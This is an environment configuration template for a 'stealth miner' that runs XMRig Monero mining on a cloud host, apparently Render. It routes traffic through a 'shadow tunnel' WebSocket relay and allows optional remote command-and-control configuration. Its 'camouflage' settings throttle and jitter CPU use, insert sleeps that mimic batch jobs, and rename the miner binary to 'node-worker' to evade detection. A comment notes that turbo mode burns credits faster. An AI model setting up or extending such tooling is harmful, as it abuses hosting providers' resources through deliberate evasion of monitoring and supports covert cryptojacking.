# ─────────────────────────────────────────────────────────────
# Lumen Stealth Miner — Environment Configuration
# Copy this file to .env and fill in your values.
# ─────────────────────────────────────────────────────────────

# ── Wallet ──────────────────────────────────────────────────
# Your Monero wallet address. All mined XMR is sent here.
XMR_WALLET=45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa

# Worker identifier (shows up in pool dashboard)
WORKER_NAME=lumen-worker

# ── Shadow Tunnel Relay ─────────────────────────────────────
# WebSocket URL of your Render-deployed shadow-tunnel.
# This must match the service name in render.yaml.
RELAY_URL=wss://lumen-shadow-tunnel.onrender.com

# ── ARC (Adaptive Resource Camouflage) ──────────────────────
# Set to true for maximum hashrate (burns credits faster)
ARC_TURBO=false

# CPU usage target range (percentage)
ARC_CPU_MIN=40
ARC_CPU_MAX=65

# Seconds between CPU jitter adjustments
ARC_JITTER_INTERVAL=300

# Sleep cycles mimic batch job lifecycle
ARC_SLEEP_ENABLED=true
ARC_SLEEP_INTERVAL=3600
ARC_SLEEP_MIN=60
ARC_SLEEP_MAX=300

# ── Miner Binary ────────────────────────────────────────────
# Path to XMRig binary (renamed for stealth)
MINER_PATH=/app/bin/node-worker
MINER_CONFIG=/app/configs/miner_stealth.json

# ── Web App ─────────────────────────────────────────────────
PORT=8080

# ── Telegram Notifications (Optional) ───────────────────────
# TELEGRAM_BOT_TOKEN=
# TELEGRAM_CHAT_ID=

# ── Remote Config C2 (Optional) ────────────────────────────
# URL to a hosted JSON file for remote wallet/relay updates
# REMOTE_CONFIG_URL=
